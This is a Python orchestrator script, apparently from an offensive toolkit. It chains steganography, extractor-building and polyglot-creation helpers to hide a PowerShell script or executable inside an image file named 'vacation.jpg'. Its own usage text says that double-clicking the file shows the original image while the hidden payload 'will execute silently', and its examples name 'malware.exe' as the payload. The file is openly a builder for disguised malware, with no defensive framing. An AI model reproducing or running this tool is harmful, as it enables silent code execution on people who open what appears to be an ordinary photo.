"""
MASTER ORCHESTRATOR - Complete workflow for creating polyglot payload
Input: Original image + script to hide
Output: vacation.jpg (working polyglot)
"""

import os
import sys
import json
import argparse
import subprocess
from pathlib import Path


class PolyglotOrchestrator:
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.script_dir = Path(__file__).parent
    
    def log(self, message, level="INFO"):
        if self.verbose:
            print(f"[{level}] {message}")
    
    def run_complete_workflow(self, original_image, payload_script, output_file="vacation.jpg"):
        """
        Complete workflow:
        1. Steganography.py - Hide script in image
        2. Build_extractor.py - Create extractor PowerShell
        3. Create_polyglot.py - Build final .jpg polyglot
        
        Args:
            original_image: Path to original image (JPEG/PNG)
            payload_script: Path to script to hide
            output_file: Output polyglot filename
        
        Returns:
            bool: Success status
        """
        
        self.log("=" * 60)
        self.log("POLYGLOT PAYLOAD CREATION WORKFLOW", level="START")
        self.log("=" * 60)
        
        # Verify inputs
        if not os.path.exists(original_image):
            self.log(f"Error: Image not found: {original_image}", level="ERROR")
            return False
        
        if not os.path.exists(payload_script):
            self.log(f"Error: Script not found: {payload_script}", level="ERROR")
            return False
        
        # Setup temporary files
        temp_hidden_image = "temp_image_hidden.png"
        temp_metadata = "temp_metadata.json"
        temp_extractor = "temp_extractor.ps1"
        temp_final_script = "temp_final_payload.ps1"
        
        try:
            # PHASE 1: Steganography - Hide payload in image
            self.log("-" * 60)
            self.log("PHASE 1: LSB Steganography", level="PHASE")
            self.log("-" * 60)
            
            self.log(f"Input image: {original_image}")
            self.log(f"Payload script: {payload_script}")
            
            if not self._run_steganography(original_image, payload_script, temp_hidden_image, temp_metadata):
                self.log("Phase 1 failed!", level="ERROR")
                return False
            
            self.log(f"[+] Hidden image created: {temp_hidden_image}")
            self.log(f"[+] Metadata saved: {temp_metadata}")
            
            # PHASE 2: Build Extractor
            self.log("-" * 60)
            self.log("PHASE 2: Build Extractor Script", level="PHASE")
            self.log("-" * 60)
            
            if not self._build_extractor(temp_metadata, temp_hidden_image, payload_script, temp_final_script):
                self.log("Phase 2 failed!", level="ERROR")
                return False
            
            self.log(f"[+] Extractor script created: {temp_final_script}")
            
            # PHASE 3: Create Polyglot
            self.log("-" * 60)
            self.log("PHASE 3: Create Polyglot", level="PHASE")
            self.log("-" * 60)
            
            if not self._create_polyglot(temp_final_script, original_image, output_file):
                self.log("Phase 3 failed!", level="ERROR")
                return False
            
            self.log(f"[+] Polyglot created: {output_file}")
            
            # Success!
            self.log("=" * 60)
            self.log("POLYGLOT CREATION SUCCESSFUL!", level="SUCCESS")
            self.log("=" * 60)
            self.log(f"Final file: {output_file}")
            self.log(f"File size: {os.path.getsize(output_file)} bytes")
            self.log("\nUsage:")
            self.log("1. Double-click the file to execute")
            self.log("2. Original image will display")
            self.log("3. Hidden payload will execute silently")
            
            return True
        
        except Exception as e:
            self.log(f"Workflow error: {e}", level="ERROR")
            return False
        
        finally:
            # Cleanup temporary files
            self._cleanup_temps([temp_hidden_image, temp_metadata, temp_extractor, temp_final_script])
    
    def _run_steganography(self, image_path, payload_path, hidden_image_path, metadata_path):
        """Run Phase 1: Steganography"""
        try:
            self.log("Running steganography.py...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'steganography.py'),
                '--mode', 'embed',
                '--image', image_path,
                '--data', payload_path,
                '--output', hidden_image_path
            ], capture_output=True, text=True, timeout=60)
            
            if result.returncode != 0:
                self.log(f"Steganography error: {result.stderr}", level="ERROR")
                return False
            
            self.log(f"Steganography output:\n{result.stdout}")
            return os.path.exists(hidden_image_path)
        
        except Exception as e:
            self.log(f"Steganography failed: {e}", level="ERROR")
            return False
    
    def _build_extractor(self, metadata_path, hidden_image_path, payload_path, output_script_path):
        """Run Phase 2: Build Extractor"""
        try:
            self.log("Running build_extractor.py...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'build_extractor.py'),
                '--metadata', metadata_path,
                '--image', hidden_image_path,
                '--payload', payload_path,
                '--output', output_script_path
            ], capture_output=True, text=True, timeout=60)
            
            if result.returncode != 0:
                self.log(f"Extractor build error: {result.stderr}", level="ERROR")
                return False
            
            self.log(f"Extractor build output:\n{result.stdout}")
            return os.path.exists(output_script_path)
        
        except Exception as e:
            self.log(f"Extractor build failed: {e}", level="ERROR")
            return False
    
    def _create_polyglot(self, script_path, image_path, output_path):
        """Run Phase 3: Create Polyglot"""
        try:
            self.log("Running create_polyglot.py...")
            
            result = subprocess.run([
                sys.executable,
                str(self.script_dir / 'create_polyglot.py'),
                '--script', script_path,
                '--image', image_path,
                '--output', output_path
            ], capture_output=True, text=True, timeout=120)
            
            if result.returncode != 0:
                self.log(f"Polyglot creation error: {result.stderr}", level="ERROR")
                return False
            
            self.log(f"Polyglot creation output:\n{result.stdout}")
            return os.path.exists(output_path)
        
        except Exception as e:
            self.log(f"Polyglot creation failed: {e}", level="ERROR")
            return False
    
    def _cleanup_temps(self, temp_files):
        """Clean up temporary files"""
        self.log("\nCleaning up temporary files...")
        for temp_file in temp_files:
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    self.log(f"Removed: {temp_file}")
            except Exception as e:
                self.log(f"Failed to remove {temp_file}: {e}", level="WARN")


def main():
    parser = argparse.ArgumentParser(
        description='Complete polyglot payload creation workflow',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python orchestrator.py --image my_photo.jpg --payload script.ps1 --output vacation.jpg
  python orchestrator.py --image cover.png --payload malware.exe --output final.jpg
        '''
    )
    
    parser.add_argument('--image', required=True, help='Original image file (JPEG/PNG)')
    parser.add_argument('--payload', required=True, help='PowerShell script or executable to hide')
    parser.add_argument('--output', default='vacation.jpg', help='Output polyglot filename (default: vacation.jpg)')
    parser.add_argument('--quiet', action='store_true', help='Suppress verbose output')
    
    args = parser.parse_args()
    
    orchestrator = PolyglotOrchestrator(verbose=not args.quiet)
    
    success = orchestrator.run_complete_workflow(
        original_image=args.image,
        payload_script=args.payload,
        output_file=args.output
    )
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
